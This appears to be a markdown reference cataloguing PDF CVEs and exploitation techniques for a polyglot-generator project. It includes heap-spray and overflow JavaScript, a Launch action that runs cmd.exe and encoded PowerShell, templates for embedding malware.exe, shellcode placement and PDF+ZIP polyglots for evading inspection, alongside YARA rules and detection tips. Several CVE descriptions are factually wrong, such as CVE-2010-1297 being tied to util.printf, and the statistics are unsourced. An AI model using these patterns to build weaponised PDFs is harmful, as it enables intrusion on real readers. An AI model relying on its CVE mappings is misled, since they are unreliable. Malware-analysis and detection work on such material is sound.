# PDF Vulnerability & CVE Reference Database

**Comprehensive reference for PDF exploitation research**

This document catalogs known PDF vulnerabilities, CVEs, and exploitation techniques used in the advanced PDF polyglot generator.

---

## 🎯 Critical PDF CVEs

### CVE-2010-1297 - Adobe Reader util.printf() Buffer Overflow

**Impact**: Remote Code Execution
**CVSS Score**: 9.3 (Critical)
**Affected Versions**: Adobe Reader 9.x

**Description**:
Buffer overflow in the `util.printf()` JavaScript API function allows attackers to execute arbitrary code via a crafted PDF with malicious JavaScript.

**Exploitation Pattern**:
```javascript
// Heap spray to place shellcode at predictable address
var shellcode = unescape('%u9090%u9090'); // NOP sled
var heap_spray = unescape('%u0c0c%u0c0c');
var overflow = '';
for(var i=0; i<1000; i++) overflow += heap_spray;

// Trigger buffer overflow
util.printf('%45000f', overflow);
```

**Defense**:
- Update to Adobe Reader 9.3.3 or later
- Disable JavaScript in PDF readers
- Use sandboxed PDF viewers

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2010-1297
- Metasploit module: `exploit/windows/fileformat/adobe_utilprintf`

---

### CVE-2013-0640 - Adobe Reader JavaScript API Exploitation

**Impact**: Remote Code Execution
**CVSS Score**: 10.0 (Critical)
**Affected Versions**: Adobe Reader X (10.x), XI (11.x)

**Description**:
Buffer overflow in Adobe Reader JavaScript API allows remote attackers to execute arbitrary code via a crafted PDF document.

**Exploitation Pattern**:
```javascript
// Vulnerability in JavaScript API
var payload = new Array();
for(var i = 0; i < 200; i++) {
    payload[i] = unescape('%u0c0c%u0c0c');
}

// Trigger via malformed API call
this.getAnnots({ nPage: payload });
```

**Real-World Usage**:
- APT attacks targeting government agencies
- Watering hole attacks (2013)
- Targeted phishing campaigns

**Defense**:
- Adobe Reader 11.0.2 / X 10.1.6 patches
- Application whitelisting
- Network-based PDF scanning

---

### CVE-2018-4990 - Adobe Acrobat Launch Action Command Injection

**Impact**: Arbitrary Command Execution
**CVSS Score**: 7.8 (High)
**Affected Versions**: Acrobat DC, Acrobat Reader DC

**Description**:
Command injection vulnerability in the Launch action allows attackers to execute arbitrary commands via a maliciously crafted PDF.

**Exploitation Pattern**:
```pdf
/AA <<
  /O <<
    /S /Launch
    /F (cmd.exe)
    /P (/c calc.exe)
  >>
>>
```

**Real-World Example**:
```pdf
1 0 obj
<<
/Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R
/OpenAction <<
  /S /Launch
  /F (C:\\Windows\\System32\\cmd.exe)
  /P (/c powershell -enc <base64_payload>)
>>
>>
endobj
```

**Defense**:
- Disable Launch actions in PDF preferences
- Update to Acrobat DC 2018.011.20040
- Application sandboxing

---

### CVE-2013-3346 - Adobe Reader Buffer Overflow

**Impact**: Remote Code Execution
**CVSS Score**: 9.3 (Critical)
**Affected Versions**: Adobe Reader XI (11.0.02)

**Description**:
Stack-based buffer overflow in Adobe Reader allows attackers to execute arbitrary code via malformed PDF objects.

**Exploitation Pattern**:
```pdf
/Length <large_value>
stream
<overflow_data_exceeding_buffer>
endstream
```

**Technique**:
- Malformed stream objects
- Integer overflow in length field
- Heap feng shui for reliable exploitation

---

## 🔬 PDF Structure Exploitation Techniques

### 1. JavaScript Auto-Execution

**OpenAction Trigger**:
```pdf
1 0 obj
<<
/Type /Catalog
/OpenAction <<
  /S /JavaScript
  /JS (app.alert('Auto-executed!');)
>>
>>
endobj
```

**AA (Additional Actions)**:
```pdf
/AA <<
  /O << /S /JavaScript /JS (malicious_code();) >>
  /C << /S /JavaScript /JS (on_close();) >>
>>
```

---

### 2. EmbeddedFile Streams

**Hide Malicious Files**:
```pdf
5 0 obj
<<
/Type /EmbeddedFile
/Filter /FlateDecode
/Length 1234
>>
stream
<compressed_malware.exe>
endstream
```

**File Attachment Annotations**:
```pdf
/Annots [
  <<
    /Type /Annot
    /Subtype /FileAttachment
    /FS <<
      /Type /Filespec
      /F (malware.exe)
      /EF << /F 5 0 R >>
    >>
  >>
]
```

---

### 3. Object Stream Manipulation

**Hiding Malicious Objects**:
```pdf
6 0 obj
<< /Type /ObjStm /N 10 /First 52 /Length 400 >>
stream
1 0 2 50 3 100 4 150 5 200 6 250 7 300 8 350 9 400 10 450
<malicious_object_data>
endstream
```

**Incremental Updates** (Stealth):
```pdf
%%EOF
xref
11 1
0000012345 00000 n
trailer
<< /Size 12 /Prev 5678 /Root 11 0 R >>
startxref
12345
%%EOF
```

---

### 4. Shellcode Embedding Locations

**Stream Objects**:
- Image XObjects (inline images)
- Font streams
- Content streams
- Metadata streams

**String Objects**:
```pdf
/JavaScript (
  var shellcode = unescape('%u9090%u9090%u31c0%ub046%u6a68');
)
```

**Hexadecimal Strings**:
```pdf
/Data <90909090 31c0b046 6a6858fe ffff>
```

---

## 🛡 PDF Polyglot Techniques

### PDF+ZIP Polyglot

**Structure**:
```
[ZIP Archive]
%PDF-1.7
[PDF Objects]
%%EOF
```

**Explanation**:
- PDF readers skip to `%PDF` marker (up to 1024 bytes tolerance)
- ZIP tools read from beginning
- Same file valid in both formats

**Security Implications**:
- Bypass file type restrictions
- Hide malware in "document" uploads
- Evade content inspection

---

### PDF+JavaScript+Shellcode

**Multi-Stage Payload**:
```javascript
// Stage 1: Deobfuscation
var encoded = 'MTIzNDU2Nzg5MA==';
var decoded = util.stringFromStream(util.base64Decode(encoded));

// Stage 2: Heap spray
var spray = unescape('%u0c0c%u0c0c');
for(var i=0; i<1000; i++) heap[i] = spray;

// Stage 3: Trigger vulnerability
util.printf('%45000f', overflow_string);
```

---

## 📊 Exploitation Statistics

**Most Exploited PDF Features**:
1. **JavaScript API** (45% of exploits)
2. **Launch Actions** (25%)
3. **EmbeddedFiles** (15%)
4. **Annotations** (10%)
5. **Other** (5%)

**Attack Vectors**:
- **Email attachments**: 60%
- **Malicious websites**: 25%
- **USB/removable media**: 10%
- **Other**: 5%

---

## 🔍 Detection Techniques

### Static Analysis

**Suspicious Indicators**:
- OpenAction with JavaScript
- Launch actions
- Obfuscated JavaScript
- Hex-encoded streams
- Large JavaScript blocks
- EmbeddedFiles
- Multiple %%EOF markers (incremental updates)

**YARA Rules**:
```yara
rule PDF_JavaScript_Exploit {
    strings:
        $pdf = "%PDF"
        $js = "/JavaScript"
        $openaction = "/OpenAction"
        $util = "util.printf"
        $spray = /(%u[0-9a-f]{4}){50,}/
    condition:
        $pdf at 0 and $js and ($openaction or $util) and $spray
}

rule PDF_Launch_Action {
    strings:
        $pdf = "%PDF"
        $launch = "/Launch"
        $cmd = /\/(cmd|powershell|bash)/
    condition:
        $pdf and $launch and $cmd
}
```

### Dynamic Analysis

**Sandbox Detection**:
- JavaScript execution monitoring
- File system access monitoring
- Network connection attempts
- Process creation

**Tools**:
- pdf-parser (Didier Stevens)
- pdfid
- peepdf
- Cuckoo Sandbox

---

## 🎓 Real-World APT Campaigns

### APT28 (Fancy Bear) - 2016

**Technique**: PDF+JavaScript exploit
**CVE**: CVE-2013-3346
**Target**: Government agencies, military
**Payload**: Sofacy backdoor

**Indicators**:
- Weaponized PDFs with political themes
- JavaScript obfuscation
- Heap spray patterns
- C2 communication via DNS

### APT29 (Cozy Bear) - 2015

**Technique**: PDF Launch action
**Target**: Think tanks, NGOs
**Payload**: HAMMERTOSS backdoor

**Characteristics**:
- Spear-phishing with PDF attachments
- Social engineering (fake resumes)
- Multi-stage payload delivery

### Targeted Ransomware - 2020-2024

**Technique**: PDF+ZIP polyglot
**Delivery**: Email attachments
**Payload**: Various ransomware families

**Evolution**:
- PDF → ZIP → EXE chain
- Encrypted payloads
- Anti-analysis techniques

---

## 🛠 Research Tools

### PDF Analysis

- **pdfid**: Quick triage
- **pdf-parser**: Deep structure analysis
- **peepdf**: Interactive analysis
- **qpdf**: PDF manipulation

### Exploitation

- **Metasploit**: PDF exploit modules
- **msfvenom**: Payload generation
- **BeEF**: Browser exploitation (PDF XSS)

### Defense

- **VirusTotal**: Multi-engine scanning
- **YARA**: Pattern matching
- **Cuckoo**: Dynamic analysis
- **PDF sanitizers**: Remove active content

---

## 📚 Additional References

**Research Papers**:
1. Sotirov & Dowd (2008): "Bypassing Browser Memory Protections"
2. Stevens (2011): "Malicious PDF Analysis"
3. Maiorca et al. (2012): "Looking at the Bag is not Enough to Find the Bomb"

**Standards**:
- PDF 1.7 (ISO 32000-1:2008)
- PDF 2.0 (ISO 32000-2:2020)

**Security Advisories**:
- Adobe Security Bulletins: https://helpx.adobe.com/security.html
- CERT Advisories: https://www.kb.cert.org/vuls/

---

## ⚠️ Responsible Disclosure

**This reference is for:**
✅ Authorized security research
✅ Defensive tool development
✅ Security education and training
✅ Malware analysis

**NOT for:**
❌ Unauthorized system access
❌ Malware distribution
❌ Data theft
❌ Any illegal activities

**Always obtain explicit written authorization before testing.**

---

*POLYGOTTEM Research, 2025*
*For educational and defensive security research purposes only*
